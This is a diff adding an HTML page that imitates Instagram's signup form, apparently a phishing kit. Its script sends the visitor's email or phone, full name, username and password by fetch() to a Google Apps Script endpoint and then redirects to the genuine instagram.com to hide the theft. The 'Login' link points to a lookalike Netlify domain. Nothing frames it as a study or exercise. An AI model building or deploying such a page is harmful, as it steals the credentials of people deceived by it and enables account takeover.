@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram Signup</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="shortcut icon" type="image/x-icon" href="iconfinder-social-media-applications-3instagram-4102579_113804.ico"/>
+</head>
+<body class="dark">
+  <div class="main">
+    <div class="container">
+      <div class="logo">Instagram</div>
+      <p class="intro-text">Sign up to see photos and videos from your friends.</p>
+      <form method="POST" name="google-sheet">
+        <label for="Email"></label>  
+        <input type="text" placeholder="Mobile Number or Email" name="Email">
+
+        <label for="FullName"></label>
+        <input type="text" placeholder="Full Name" name="FullName">
+        
+        <label for="Name"></label>
+        <input type="text" placeholder="Username" name="Name">
+        
+        <label for="Password"></label>
+        <input type="password" placeholder="Password" name="Password">
+        
+        <button class="signup-btn">Sign Up</button>
+
+      <div class="or-divider">
+        <div class="line"></div>
+        <div class="or">OR</div>
+        <div class="line"></div>
+      </div>
+
+      <div class="fb-login">Log in with Facebook</div>
+      <div class="forgot">Forgot password?</div>
+    </div>
+
+    <div class="bottom-box">
+      Have an account? <a href="http://iginstalogin.netlify.app">Login</a>
+    </div>
+
+    <div class="dark-toggle" onclick="toggleDarkMode()">🌙 Toggle Dark Mode</div>
+  </div>
+
+  <script>
+    function toggleDarkMode() {
+      document.body.classList.toggle('dark');
+    }
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbw0SyUFGvALrdgBFFHZNf_XF0j4OPonY8v0m8lDhhqXgBtX4gdpZO6VJVgXtMVolZj_/exec'
+            const form = document.forms['google-sheet']
+
+            form.addEventListener('submit', e => {
+                e.preventDefault()
+                fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                    .then(window.location.href = "https://www.instagram.com")
+            })
+  </script>
+</body>
+</html>
